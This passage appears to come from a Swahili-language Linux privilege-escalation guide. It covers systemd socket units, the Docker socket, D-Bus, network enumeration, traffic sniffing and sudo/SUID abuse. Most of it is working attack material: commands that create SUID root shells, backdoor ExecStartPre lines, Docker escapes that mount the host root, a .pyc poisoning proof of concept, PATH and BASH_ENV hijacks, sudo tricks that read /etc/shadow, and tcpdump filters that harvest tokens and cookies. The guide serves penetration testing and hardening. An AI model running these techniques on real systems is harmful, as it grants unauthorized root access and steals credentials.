- Kupata some systemd unit (kama `.service`) ambayo inatekeleza executable binary inayoweza kuandikwa
- Kupata some systemd unit ambayo inatekeleza relative path na una **writable privileges** juu ya **systemd PATH** (ili kujifanya hiyo executable)

**Jifunze zaidi kuhusu timers with `man systemd.timer`.**

### **Enabling Timer**

Ili kuwezesha timer unahitaji root privileges na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) huwezesha **mawasiliano ya process** kwenye mashine ile ile au tofauti ndani ya mifumo ya client-server. Hutumia faili za kawaida za Unix descriptor kwa mawasiliano kati ya kompyuta na huwekwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti lakini muhtasari wake hutumika ku**onyesha itasikiliza wapi** kwenye socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port ya kusikiliza, n.k.)
- `Accept`: Huchukua argument ya boolean. Ikiwa **true**, **service instance** huanzishwa kwa kila incoming connection na connection socket pekee hupitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza zenyewe hu**pitishwa kwa service unit** iliyoanzishwa, na ni service unit moja tu huanzishwa kwa miunganisho yote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs ambapo service unit moja hushughulikia trafiki yote inayoingia bila masharti. **Default ni false**. Kwa sababu za performance, inapendekezwa kuandika daemons wapya kwa njia inayofaa tu kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Huchukua command line moja au zaidi, ambazo hu**tekelezwa kabla** au **baada ya** sockets/FIFOs za kusikiliza ku**undwa** na ku-bound, mtawalia. Tokeni ya kwanza ya command line lazima iwe jina la faili kamili la absolute, kisha ifuatwe na arguments za process.
- `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo hu**tekelezwa kabla** au **baada ya** sockets/FIFOs za kusikiliza ku**fungwa** na kuondolewa, mtawalia.
- `Service`: Hubainisha jina la unit ya **service** la ku**activate** kwenye **incoming traffic**. Mpangilio huu unaruhusiwa tu kwa sockets zenye Accept=no. Kwa default ni service yenye jina lile lile kama socket (ukiwa na suffix iliyobadilishwa). Katika hali nyingi, si lazima kutumia option hii.

### Writable .socket files

Ukikuta faili ya `.socket` inayoweza ku**andikwa**, unaweza ku**ongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket haijaundwa. Kwa hiyo, **huenda ukahitaji kusubiri hadi mashine ianze upya.**\
_Kumbuka kuwa mfumo lazima uwe unatumia usanidi huo wa socket file la sivyo backdoor haitatekelezwa_

### Socket activation + writable unit path (create missing service)

Mwingiliano mwingine wa hatari kubwa ni:

- socket unit yenye `Accept=no` na `Service=<name>.service`
- service unit iliyorejelewa haipo
- mshambuliaji anaweza kuandika ndani ya `/etc/systemd/system` (au unit search path nyingine)

Katika hali hiyo, mshambuliaji anaweza kuunda `<name>.service`, kisha kuchochea trafiki kwenda kwenye socket ili systemd ipakie na kutekeleza service mpya kama root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Soksi zinazoweza kuandikwa

Ukigundua **soksi yoyote inayoweza kuandikwa** (_sasa tunazungumza kuhusu Unix Sockets na si kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na soksi hiyo na huenda ukatumia udhaifu.

### Hesabu Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa moja kwa moja
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa huenda kukawa na baadhi ya **sockets zinazotegeshea** maombi ya HTTP (_sizungumzii kuhusu .socket files bali kuhusu files zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
If the socket **ijibu** kwa ombi la **HTTP**, basi unaweza **kuwasiliana** nayo na labda **kuitumia vibaya** baadhi ya udhaifu.

### Writable Docker Socket

Docker socket, mara nyingi hupatikana katika `/var/run/docker.sock`, ni faili muhimu ambalo linapaswa kulindwa. Kwa chaguo-msingi, linaweza kuandikwa na mtumiaji `root` na wanachama wa kikundi `docker`. Kuwa na write access kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza kuongeza privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from containers or abuse container runtimes to escalate privileges** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisasa wa **inter-Process Communication (IPC)** unaowawezesha applications kuingiliana na kushiriki data kwa ufanisi. Ukiwa umebuniwa kwa kuzingatia mfumo wa kisasa wa Linux, unatoa mfumo thabiti kwa aina mbalimbali za mawasiliano ya applications.

Mfumo huu ni wa matumizi mengi, ukiunga mkono msingi wa IPC unaoboreshwa ambao huongeza ubadilishanaji wa data kati ya processes, unaofanana na **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kusambaza events au signals, na hivyo kurahisisha muunganisho laini kati ya components za mfumo. Kwa mfano, signal kutoka kwa Bluetooth daemon kuhusu simu inayoingia unaweza kuisababisha music player kunyamazisha sauti, jambo linaloboreshwa user experience. Pia, D-Bus inaunga mkono remote object system, ikirahisisha service requests na method invocations kati ya applications, na kurahisisha processes ambazo kwa kawaida zilikuwa tata.

D-Bus hufanya kazi kwa **allow/deny model**, ikisimamia ruhusa za messages (method calls, signal emissions, etc.) kulingana na athari ya pamoja ya policy rules zinazolingana. Policies hizi huainisha mwingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia unyonyaji wa ruhusa hizi.

Mfano wa policy kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukifafanua ruhusa kwa root user kumiliki, kutuma kwenda kwa, na kupokea messages kutoka `fi.w1.wpa_supplicant1`.

Policies zisizo na user au group iliyobainishwa hutumika kwa wote, huku policies za muktadha wa "default" zikitumika kwa yote ambayo hayajashughulikiwa na policies nyingine mahususi.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kuorodhesha na kutumia D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Daima ni ya kuvutia kuorodhesha network na kubaini nafasi ya machine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Uchuzi wa haraka wa kuchambua outbound filtering

Ikiwa host inaweza kuendesha commands lakini callbacks zinashindwa, tenganisha DNS, transport, proxy, na route filtering haraka:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Milango wazi ya port

Daima kagua huduma za mtandao zinazoendeshwa kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Panga listeners kwa bind target:

- `0.0.0.0` / `[::]`: zinaonekana kwenye local interfaces zote.
- `127.0.0.1` / `::1`: local-only (wagombea wazuri wa tunnel/forward).
- Specific internal IPs (kwa mfano `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinafikiwa tu kutoka internal segments.

### Local-only service triage workflow

Unapomgandamiza host, services zilizo bound kwa `127.0.0.1` mara nyingi huwa reachable kwa mara ya kwanza kutoka shell yako. Workflow ya haraka ya local ni:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kama network scanner (network-only mode)

Mbali na local PE checks, linPEAS inaweza kufanya kazi kama focused network scanner. Inatumia binaries zinazopatikana katika `$PATH` (kwa kawaida `fping`, `ping`, `nc`, `ncat`) na haiinstall tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ukipita `-d`, `-p`, au `-i` bila `-t`, linPEAS hufanya kazi kama network scanner ya kawaida tu (ikipuuza sehemu nyingine ya privilege-escalation checks).

### Sniffing

Angalia kama unaweza sniff traffic. Kama unaweza, huenda ukaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
Ukaguzi wa haraka wa vitendo:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ina thamani kubwa sana katika post-exploitation kwa sababu huduma nyingi za ndani pekee huonyesha tokens/cookies/credentials hapo:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Nasa sasa, changanua baadaye:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Watumiaji

### Uorodheshaji wa Kawaida

Angalia **wewe ni nani**, una **privileges** zipi, ni **users** gani zipo kwenye systems, ni zipi zinaweza **login** na ni zipi zina **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Baadhi ya matoleo ya Linux yaliathiriwa na bug inayoruhusu watumiaji wenye **UID > INT_MAX** kuongeza privilege. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** kwa kutumia: **`systemd-run -t /bin/bash`**

### Groups

Angalia kama wewe ni **member ya group** fulani ambayo inaweza kukupa root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu chochote cha kuvutia kilicho ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera la Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zinazojulikana

Ukijua **neno lolote la siri** la mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia hilo nenosiri.

### Su Brute

Usipokuwa na tatizo na kufanya kelele nyingi na binaries `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kufanya brute-force kwa mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye kigezo `-a` pia hujaribu kufanya brute-force kwa watumiaji.

## Matumizi mabaya ya Writable PATH

### $PATH

Ukigundua kuwa unaweza **kuandika ndani ya folda yoyote ya $PATH** unaweza kuweza kuongeza privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** yenye jina la amri fulani ambayo itatekelezwa na mtumiaji tofauti (root ideally) na ambayo **haipakuliwi kutoka kwenye folda ambayo iko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani ukitumia sudo au wanaweza kuwa na bit ya suid. Iangalie kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa hukuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mipangilio ya Sudo inaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi sana kupata shell kwa kuongeza ssh key ndani ya root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanamruhusu mtumiaji **kuweka environment variable** wakati wa kutekeleza kitu fulani:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **uliotokana na HTB machine Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia arbitrary python library wakati wa kuendesha script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

If a **sudo-allowed Python script** imports a module whose package directory contains a **writable `__pycache__`**, unaweza ku replace cached `.pyc` na kupata code execution kama user mwenye privilejio kwenye import inayofuata.

- Kwa nini inafanya kazi:
- CPython huhifadhi bytecode caches katika `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter huthibitisha **header** (magic + metadata ya timestamp/hash iliyofungwa kwa source), kisha hu execute marshaled code object iliyohifadhiwa baada ya header hiyo.
- Ukweza **kufuta na kuunda tena** cached file kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini isiyo writable bado inaweza kubadilishwa.
- Njia ya kawaida:
- `sudo -l` huonyesha Python script au wrapper unayoweza kuendesha kama root.
- Script hiyo hu import local module kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
- `__pycache__` directory ya module iliyo importiwa inaweza kuandikwa na user wako au na kila mtu.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ukiweza kukagua script yenye privilege, tambua modules zilizoimportiwa na njia yao ya cache:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. Endesha script iliyoruhusiwa na sudo mara moja ili Python iunde legit cache file ikiwa haipo tayari.
2. Soma bytes 16 za mwanzo kutoka `.pyc` legit na zitumie tena katika file yenye poisoned.
3. Compile payload code object, `marshal.dumps(...)` hiyo, futa original cache file, kisha iunde upya kwa kutumia original header pamoja na malicious bytecode yako.
4. Endesha tena script iliyoruhusiwa na sudo ili import itekeleze payload yako kama root.

Important notes:

- Kutumia tena original header ni muhimu kwa sababu Python hukagua cache metadata dhidi ya source file, si kama bytecode body kweli inalingana na source.
- Hii ni muhimu sana wakati source file inamilikiwa na root na haiwezi kuandikwa, lakini `__pycache__` directory iliyo nayo inaweza kuandikwa.
- Attack hushindwa ikiwa privileged process inatumia `PYTHONDONTWRITEBYTECODE=1`, inaimport kutoka eneo lenye safe permissions, au inaondoa write access kwenye kila directory ndani ya import path.

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Hakikisha hakuna saraka katika privileged Python import path inayoweza kuandikwa na low-privileged users, ikiwemo `__pycache__`.
- Kwa privileged runs, fikiria `PYTHONDONTWRITEBYTECODE=1` na ukaguzi wa mara kwa mara wa `__pycache__` directories zisizotarajiwa ambazo zina writable.
- Tibu writable local Python modules na writable cache directories kwa njia ileile ungetibu writable shell scripts au shared libraries zinazoendeshwa na root.

### BASH_ENV preserved via sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia Bash’s non-interactive startup behavior kuendesha arbitrary code kama root unapoitisha command iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa non-interactive shells, Bash husoma `$BASH_ENV` na huingiza file hiyo kabla ya kuendesha target script. Sheria nyingi za sudo huruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, file yako huingizwa na root privileges.

- Requirements:
- Sudo rule unayoweza kuendesha (target yoyote inayoitisha `/bin/bash` non-interactively, au script yoyote ya bash).
- `BASH_ENV` iwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, pendelea `env_reset`.
- Epuka shell wrappers kwa commands zinazoruhusiwa na sudo; tumia minimal binaries.
- Zingatia sudo I/O logging na alerting wakati preserved env vars zinatumika.

### Terraform kupitia sudo na preserved HOME (!env_reset)

Ikiwa sudo inaacha environment intact (`!env_reset`) huku ikiruhusu `terraform apply`, `$HOME` hubaki kama ya user anayeita. Terraform hivyo hupakia **$HOME/.terraformrc** kama root na hutii `provider_installation.dev_overrides`.

- Elekeza required provider kwenye writable directory na weka malicious plugin yenye jina la provider (k.m., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kwenye Go plugin handshake lakini hutekeleza payload kama root kabla ya kufa, na kuacha SUID shell nyuma.

### TF_VAR overrides + symlink validation bypass

Terraform variables zinaweza kutolewa kupitia `TF_VAR_<name>` environment variables, ambazo hubaki pale sudo inapohifadhi environment. Weak validations kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` zinaweza kupitiwa kwa kutumia symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform hutatua symlink na kunakili `/root/root.txt` halisi kwenda kwenye lengwa linaloweza kusomwa na mshambuliaji. Njia hiyo hiyo inaweza kutumika kuandika ndani ya njia zenye ruhusa kwa kuunda mapema symlinks za lengwa (kwa mfano, kuelekeza njia ya lengwa ya provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa na `requiretty`, ambayo hulazimisha sudo kuendeshwa tu kutoka kwa interactive TTY. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka kwa non-interactive contexts kama reverse shells, cron jobs, au scripts.
```bash
Defaults !requiretty
```
Hii si dosari la moja ya moja kwa moja lenyewe, lakini huongeza hali ambazo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` iliyo na entries zinazoweza kuandikwa na mshambulizi (kwa mfano, `/home/<user>/bin`), amri yoyote ya relative ndani ya target inayoruhusiwa na sudo inaweza kufunikwa.

- Requirements: sheria ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayopiga simu amri bila absolute paths (`free`, `df`, `ps`, n.k.) na PATH entry inayoweza kuandikwa inayotafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Njia za kupitisha utekelezaji wa Sudo
**Ruka** kusoma faili zingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumiwa (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila command path

Kama **sudo permission** imepewa command moja **bila kubainisha path**: _hacker10 ALL= (root) less_ unaweza kuitumia vibaya kwa kubadilisha variable ya PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kutaja path yake (kila wakati angalia kwa** _**strings**_ **maudhui ya suid binary ya ajabu)**.

[Mifano ya payload za kutekeleza.](payloads-to-execute.md)

### SUID binary with command path

Ikiwa **suid** binary **inatekeleza amri nyingine ikitaja path**, basi unaweza kujaribu **kutoa function** iliyoitwa kwa jina la amri ambayo faili ya suid inaita.

Kwa mfano, ikiwa suid binary inaita _**/usr/sbin/service apache2 start**_ lazima ujaribu kuunda function hiyo na kuiexport:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapopiga simu kwa `suid` binary, function hii itatekelezwa

### Writable script executed by a SUID wrapper

Hitilafu ya kawaida ya custom-app ni `root`-owned SUID binary wrapper inayotekeleza script, wakati script yenyewe inaweza kuandikwa na low-priv users.

Mfano wa kawaida:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikwa, unaweza kuongeza payload commands kisha utekeleze SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Ukaguzi wa haraka:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

